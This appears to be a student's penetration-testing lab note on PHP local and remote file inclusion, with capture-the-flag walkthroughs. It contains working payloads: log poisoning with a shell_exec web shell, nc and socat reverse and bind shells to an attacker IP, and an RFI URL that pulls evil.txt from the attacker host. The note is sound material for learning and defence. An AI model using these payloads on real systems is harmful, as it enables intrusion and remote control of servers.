# File Inclusion Vulnereabilities
File inclusion vulnerabilites, unlike directory traversals (which only allows the attacker to view files), allows an attacker to include a file into the application's running code.

Local File Inclusions (LFI) occur when the included file is loaded from the same web server.

Remote File Inclusions (RFI) occur when the file is loaded from an external source.


# Identifying File Inclusion Vulnerabilities
File inclusion vulnerabilites are identified similarly to directory traversals - by locating the parameters to manipulate and attempt to load arbitary files. However, we take this one step further by executing the contents of the file within the application.

RFI vulnerabilities can also be checked by changing the values to a URL instead of a local path. However, modern PHP versions disables remote URL includes, which reduces the likelihood of discovering RFIs. 

RFIs are easier to exploit than LFIs, and we can use Netcat, Apache or Python to handle the request. The payload might need to be hosted on different ports, since the target server may have some firewall or routing rules.


# Local File Inclusion (LFI)
As mentioned, LFI makes use of the local files on the web server to execute code.

One example would be the **.php** code present on the server. For example, in the lab machine, *menu.php* code is as follows:
```php
<?php
	$file = $_GET["file"];
	include $file; ?>
```
This means that the application will execute any PHP code within the specified file. Hence, we need to think of ways to get our code to be executed using this application.

One way is through **log poisoning**. Web servers typically have access logs which log requests to the server. In Linux systems running Apache web servers, the logs are stored at `/var/log/apache2/access.log`, and in the Window 10 Lab Machine, the logs are stored at `c:\xampp\apache\logs\access.log`.

Knowing this, we can submit a request to the web page containing our PHP code, and then redirect the application to read the log file, essentially executing the PHP code hidden within. We do this through **netcat**.
```bash
nc -nv 10.11.0.22 80

<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?> # This is our LFI payload, where the parameter 'cmd' is our command to be executed on the web shell
```

Once we have sent our payload, we then change our URL to redirect the application to include this log file to be executed via `http://<ip-address>/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig` 

The parameter 'cmd' is our command to be executed, proving that we have a web shell. From here, we can then use either a reverse shell or bind shell to gain a full shell on the target machine. 

[[02 Notes/Bind & Reverse Shells]]

**Bind shell**
```bash
# On victim (Listener)
nc -lvnp <PORT> -e /bin/bash # or 'powershell.exe,pipes' if Windows
socat TCP-L:<PORT> EXEC:/bin/bash # alternative using socat

# On attacker
nc <TARGET-IP> <TARGET-PORT>
socat TCP:<TARGET-IP>:<TARGET-PORT> - # alternative using socat
```

**Reverse shell**
```bash
# On attacker (Listener)
nc -lvnp <PORT>
socat TCP-L:<PORT>

# On victim
nc <ATTACKER-IP> <ATTACKER-PORT> -e /bin/bash # or 'powershell.exe' if Windows
socat TCP:<ATTACKER-IP>:<ATTACKER-PORT> EXEC:"bash -li" # or 'powershell.exe,pipes' if Windows
```


# Remote File Inclusion (RFI)
While RFIs are less common than LFIs since they require specific server configuration, they are easier to exploit.

For RFIs to be used, the PHP apps must be configured with *allow_url_include* to be "On". In newer versions of PHP, this is default to be "Off".

Here is an example of an RFI:
```bash
http://<VICTIM-SERVER-IP>/menu.php?file=http://<ATTACKER-KALI-IP>/evil.txt
```

This can be tested and confirmed by launching a netcat listener on our Kali machine, before submitting the URL to the target machine. Our netcat listener should see a GET request from the victim for that particular file.
```bash
# On Kali machine
sudo nc -nvlp 80

# Submit URL to victim server to get file from our Kali machine

# listening on [any] 80 ...
# connect to [<KALI-IP>] from (UNKNOWN) [<VICTIM-IP>] 50324
# GET /evil.txt HTTP/1.0
# Host: <KALI-IP>
# Connection: close

```


# PHP wrappers
We can make use of PHP wrappers to exploit directory traversal and LFI vulnerabilities - this gives us additional flexibility when attempting to inject PHP code. Instead of passing the path to a local file, we may be able to wrap and inject our PHP code directly into the URL as plaintext.

**Data wrapper**
The data wrapper starts with `data:` followed by the type data. In this case, we will use `text/plain` for plaintext, followed by a comma to make the start of our **contents**.
```bash
http://<WEB-SERVER>/menu.php?file=data:text/plain,hello world
```

This will render our text - `hello world`, directly on the webpage. The application treated the data wrapper as if it was a file, and included it onto the page.

We can now try to replace `hello world` with PHP code to see if it executes.
```bash
http://<WEB-SERVER>/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
```

This allows us to exploit LFI without manipulating any local files as the PHP code is executed server-side.

# Topical Exercises

## Local File Inclusion
**Reverse Shell** using **socat**
On Kali:
`socat TCP-L:5566 -`

On browser:
`192.168.209.10/menu.php?file=c:\xampp\apache\logs\access.log&cmd=socat TCP:192.168.119.209:5566 EXEC:powershell.exe,pipes`

![[Pasted image 20221219190630.png]]

3.  On target VM #1 you identified a page that has a new vulnerability. Can you use this vulnerability to determine the users of this system and then leak some sensitive information (_flag.txt_) from the home directory of one of these users?.
	1. Identified directory traversal vulnerability
		1. ![[Pasted image 20221219191710.png]]
	2. Enumerate through the user's home directories to find flag.txt
		1. ![[Pasted image 20221219191946.png]]
4.  This updated Taco Truck menu page suffers from the same File Inclusion vulnerability as the first menu website, but you no longer can use other files (like _/etc/passwd_) to determine the flag's file name. Instead, on VM #2 find and pollute the log file for this system to gain a web-based shell. Use that web shell to then list the files in the main web directory to both identify and read the flag.
	1. Identified web server log files at `/var/log/apache2/access.log`
	2. Used `nc` to contaminate the log files
		1. ![[Pasted image 20221219203617.png]]
	3. Used the contaminated log files to run command to list files within the directory
		1. `http://192.168.209.52/menu.php?file=../../../var/log/apache2/access.log&cmd=ls`
		2. ![[Pasted image 20221219203720.png]]
	4. Use the contaminated log files to run command to view contents of flag file
		1. `http://192.168.209.52/menu.php?file=../../../var/log/apache2/access.log&cmd=cat%20flag_kPouhBJvGLrhLy3spjEZBBRF`
		2. ![[Pasted image 20221219203800.png]]
5.  As the third and final step, you now need to get a full shell on the target VM #3 and, not just any full shell, but a fully interactive TTY shell on the new and improved Taco Trunk website. To make your life easier, this website already has a web shell at _/cmd.php_ (no need to repeat what you have already done with polluting the logs, but you can if you really want!). This challenge exposes the internal **port 60000** (nothing is listening yet on this port) to enable the use of a bind shell instead of a reverse shell callback. Once you have a fully interactive tty shell, execute _flag_ from inside this shell to get the flag to this challenge. NOTE: The Python interpreter available on the box is named _python2.7_.
	1. Inspect source code of *cmd.php* web shell
		1. ![[Pasted image 20221219204319.png]]
	2. Test web shell
		1. `http://192.168.209.52/cmd.php?cmd=whoami`
		2. ![[Pasted image 20221219204405.png]]
	3. Open listener for bind shell with **socat**
		1. `http://192.168.209.52/cmd.php?cmd=socat%20TCP-L:60000%20EXEC:/bin/sh`
	4. Connect to listener from Kali
		1. `socat TCP:192.168.209.52:60000 -`
	5. Upgrade to pty
		1. `python2.7 -c 'import pty; pty.spawn("/bin/bash")'`
		2. ![[Pasted image 20221219231244.png]]
